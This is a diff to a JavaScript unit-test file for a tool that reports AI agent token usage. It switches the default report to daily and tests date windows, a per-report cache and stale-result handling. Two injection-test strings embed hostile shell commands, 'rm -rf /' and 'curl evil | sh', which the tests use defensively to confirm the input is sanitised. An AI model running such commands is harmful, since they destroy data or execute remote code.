@@ -17,7 +17,9 @@ function realisticCombined() {
   return {
     generatedAt: "2026-07-01T00:00:00Z",
     vmHost: "agent-vm",
-    report: "weekly",
+    report: "daily",
+    since: "20260701",
+    until: "20260701",
     tools: {
       claude: { sessions: [], totals: { totalTokens: 1425080461, totalCost: 1272.2086677 } },
       codex: { sessions: [], totals: { totalTokens: 87007562, costUSD: 85.778229 } },
@@ -28,24 +30,34 @@ function realisticCombined() {
 
 (async () => {
   // ── normalizeReport (allow-list; defends the remote script builder) ──────────
-  ok("normalizeReport: known values pass", usage.normalizeReport("session") === "session" && usage.normalizeReport("monthly") === "monthly");
-  ok("normalizeReport: unknown -> default weekly", usage.normalizeReport("bogus") === "weekly");
-  ok("normalizeReport: empty/undefined -> default", usage.normalizeReport("") === "weekly" && usage.normalizeReport(undefined) === "weekly");
+  ok("normalizeReport: known views pass (daily/monthly)", usage.normalizeReport("daily") === "daily" && usage.normalizeReport("monthly") === "monthly");
+  ok("normalizeReport: unsupported granularities collapse to default (weekly/session)", usage.normalizeReport("weekly") === "daily" && usage.normalizeReport("session") === "daily");
+  ok("normalizeReport: unknown -> default daily", usage.normalizeReport("bogus") === "daily");
+  ok("normalizeReport: empty/undefined -> default", usage.normalizeReport("") === "daily" && usage.normalizeReport(undefined) === "daily");
   // Adversarial: an injection attempt in the report must not survive into the script.
   ok("normalizeReport: injection attempt rejected -> default",
-    usage.normalizeReport('weekly"; rm -rf / #') === "weekly");
+    usage.normalizeReport('daily"; rm -rf / #') === "daily");
 
   // ── buildUsageScript (mirrors Get-AgentUsage.ps1; injection-safe) ────────────
-  const script = usage.buildUsageScript("weekly");
-  ok("script: sets the validated report", /^set -u\nREPORT="weekly"\n/.test(script));
+  const script = usage.buildUsageScript("daily");
+  ok("script: sets the validated report", /^set -u\nREPORT="daily"\n/.test(script));
   ok("script: ensures a ccusage runner (ccusage/bunx/npx)", /command -v ccusage/.test(script) && /bunx ccusage@latest/.test(script) && /npx -y ccusage@latest/.test(script));
   ok("script: runs each of the three agents", /capture claude/.test(script) && /capture codex/.test(script) && /capture opencode/.test(script));
   ok("script: combines into one JSON object with a tools map", /jq -n/.test(script) && /tools: \{ claude: \$claude, codex: \$codex, opencode: \$opencode \}/.test(script));
   ok("script: per-tool failure yields a JSON {error} object, not an abort", /\{error:\("ccusage failed for "\+\$t\)/.test(script));
+  // Each tool is scoped to the current period via --since/--until from the VM's clock.
+  ok("script: scopes ccusage to a window with --since/--until", /--since "\$SINCE" --until "\$UNTIL" --json/.test(script));
+  ok("script: derives the window from the VM's own date (not caller input)", /TODAY="\$\(date \+%Y%m%d\)"/.test(script));
+  ok("script: daily window is today only (SINCE=TODAY)", /else SINCE="\$TODAY"; fi/.test(script));
+  ok("script: monthly window starts at the 1st of the month", /if \[ "\$REPORT" = monthly \]; then SINCE="\$\(date \+%Y%m01\)"/.test(script));
+  ok("script: emits the window in the combined JSON", /since: \$since,\n\s*until: \$until,/.test(script));
+  // The monthly build carries the monthly granularity/subcommand.
+  const scriptMonthly = usage.buildUsageScript("monthly");
+  ok("script: monthly build sets REPORT=monthly", /^set -u\nREPORT="monthly"\n/.test(scriptMonthly));
   // A hostile report value can't break out of the double-quoted bash string, because
   // buildUsageScript normalizes against the allow-list first.
-  const hostile = usage.buildUsageScript('weekly"; curl evil | sh; echo "');
-  ok("script: hostile report is normalized, not interpolated", /REPORT="weekly"\n/.test(hostile) && !/curl evil/.test(hostile));
+  const hostile = usage.buildUsageScript('daily"; curl evil | sh; echo "');
+  ok("script: hostile report is normalized, not interpolated", /REPORT="daily"\n/.test(hostile) && !/curl evil/.test(hostile));
 
   // ── formatTokens ─────────────────────────────────────────────────────────────
   ok("formatTokens: billions", usage.formatTokens(1425080461) === "1.4B");
@@ -175,6 +187,49 @@ function realisticCombined() {
   await usage.collect({ runScript: counting(good), noCache: true, now: () => 4000 });
   ok("cache: noCache bypasses the cache (two runs)", calls === 2);
 
+  // The cache is keyed by report: switching daily<->monthly must re-collect (never serve
+  // the other period's numbers), but returning to a still-fresh period is instant.
+  usage.clearCache();
+  calls = 0;
+  await usage.collect({ runScript: counting(good), report: "daily", now: () => 5000 });
+  ok("cache: daily collect runs once", calls === 1);
+  await usage.collect({ runScript: counting(good), report: "monthly", now: () => 5000 });
+  ok("cache: switching to monthly re-collects (different period)", calls === 2);
+  await usage.collect({ runScript: counting(good), report: "daily", now: () => 5000 });
+  ok("cache: switching back to daily served from cache (still fresh)", calls === 2);
+
+  // ── isCurrentReport + async ordering (stale collection is discardable) ────────
+  ok("isCurrentReport: same period is current", usage.isCurrentReport("monthly", "monthly") === true);
+  ok("isCurrentReport: different period is stale", usage.isCurrentReport("daily", "monthly") === false);
+  ok("isCurrentReport: normalizes both sides (weekly/bogus -> daily)", usage.isCurrentReport("weekly", "bogus") === true);
+
+  // The race the extension must survive: a SLOW daily collect that resolves AFTER the user
+  // switched to monthly. Each collect must carry ONLY its own period's numbers (per-report
+  // cache/runner keyed by the script's REPORT), and isCurrentReport must flag the late
+  // daily result as stale so the extension discards it instead of clobbering the monthly view.
+  usage.clearCache();
+  const dailyDoc = JSON.stringify({ tools: { claude: { totals: { totalTokens: 111, totalCost: 1 } } } });
+  const monthlyDoc = JSON.stringify({ tools: { claude: { totals: { totalTokens: 222, totalCost: 2 } } } });
+  let releaseDaily;
+  const dailyGate = new Promise((r) => { releaseDaily = r; });
+  // One runner that returns each period's doc based on the script's REPORT, and stalls the
+  // daily run behind a gate so it deterministically finishes LAST.
+  const byReport = async (script) => {
+    if (/REPORT="monthly"/.test(script)) return { code: 0, stdout: monthlyDoc };
+    await dailyGate; return { code: 0, stdout: dailyDoc };
+  };
+  let currentReport = "daily";
+  const pDaily = usage.collect({ runScript: byReport, report: "daily", now: () => 6000 }).then((u) => ({ report: "daily", u }));
+  currentReport = "monthly"; // user switches while daily is still in flight
+  const pMonthly = usage.collect({ runScript: byReport, report: "monthly", now: () => 6000 }).then((u) => ({ report: "monthly", u }));
+  const mRes = await pMonthly;
+  ok("async: monthly result is current and carries monthly numbers",
+    usage.isCurrentReport(mRes.report, currentReport) && mRes.u.tools[0].tokens === 222);
+  releaseDaily();
+  const dRes = await pDaily;
+  ok("async: late daily result carries daily numbers but is flagged stale (discarded)",
+    dRes.u.tools[0].tokens === 111 && usage.isCurrentReport(dRes.report, currentReport) === false);
+
   // ── augment (folds usage into state; best-effort) ────────────────────────────
   const base = { online: true, host: "h" };
   const a1 = await usage.augment(base, { runScript: runOk(good), noCache: true });
@@ -198,7 +253,7 @@ function realisticCombined() {
 
   // ── collectRaw (export path) ─────────────────────────────────────────────────
   const raw1 = await usage.collectRaw({ runScript: runOk(good) });
-  ok("collectRaw: returns the raw JSON string on success", typeof raw1 === "string" && JSON.parse(raw1).report === "weekly");
+  ok("collectRaw: returns the raw JSON string on success", typeof raw1 === "string" && JSON.parse(raw1).report === "daily");
   ok("collectRaw: non-zero exit -> null", (await usage.collectRaw({ runScript: runOk(good, 3) })) === null);
   ok("collectRaw: malformed JSON -> null (never writes garbage)", (await usage.collectRaw({ runScript: runOk("{bad") })) === null);
   ok("collectRaw: empty -> null", (await usage.collectRaw({ runScript: runOk("") })) === null);
@@ -209,9 +264,9 @@ function realisticCombined() {
   const payload = JSON.parse(payloadStr);
   ok("export: pretty-printed JSON string", payloadStr.includes("\n  ") && typeof payloadStr === "string");
   ok("export: carries savedAt + source", payload.savedAt === "2026-07-01T12:00:00Z" && payload.source === "construct-control-panel");
-  ok("export: embeds the raw combined ccusage document", payload.ccusage && payload.ccusage.report === "weekly" && payload.ccusage.tools.claude);
+  ok("export: embeds the raw combined ccusage document", payload.ccusage && payload.ccusage.report === "daily" && payload.ccusage.tools.claude);
   ok("export: includes the parsed summary table", payload.summary && payload.summary.tools.length === 3 && payload.summary.totalCostText === "$1,358.75");
-  ok("export: records the report granularity", payload.report === "weekly");
+  ok("export: records the report granularity", payload.report === "daily");
 
   // Malformed raw text still yields a valid envelope (export must never throw).
   const badPayload = JSON.parse(usage.buildExportPayload("{not json", { savedAt: "t" }));
@@ -221,9 +276,9 @@ function realisticCombined() {
   ok("export: default savedAt is set when omitted", typeof JSON.parse(usage.buildExportPayload(good)).savedAt === "string");
 
   // ── exportFileName ───────────────────────────────────────────────────────────
-  const fn = usage.exportFileName("weekly", new Date(2026, 6, 1, 14, 30, 5)); // month is 0-based -> July
-  ok("exportFileName: construct-usage-<report>-<stamp>.json", fn === "construct-usage-weekly-20260701-143005.json", fn);
-  ok("exportFileName: invalid report normalized in the name", usage.exportFileName("bogus", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-weekly-20260102-030405.json");
+  const fn = usage.exportFileName("monthly", new Date(2026, 6, 1, 14, 30, 5)); // month is 0-based -> July
+  ok("exportFileName: construct-usage-<report>-<stamp>.json", fn === "construct-usage-monthly-20260701-143005.json", fn);
+  ok("exportFileName: invalid report normalized in the name", usage.exportFileName("bogus", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-daily-20260102-030405.json");
   ok("exportFileName: zero-pads month/day/time", usage.exportFileName("daily", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-daily-20260102-030405.json");
 
   console.log(`\n  usage unit tests — ${pass}/${pass + fail} passed\n`);
